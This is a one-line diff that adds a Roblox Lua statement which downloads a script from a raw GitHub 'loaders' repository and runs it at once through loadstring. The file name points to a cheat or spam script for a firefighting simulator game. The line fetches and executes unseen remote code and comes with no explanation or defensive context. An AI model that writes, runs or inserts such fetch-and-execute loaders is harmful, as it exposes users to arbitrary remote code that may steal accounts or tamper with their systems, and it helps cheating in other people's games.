@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/firefighting-sim-spam7-52e4g6isgcrb55.lua"))()
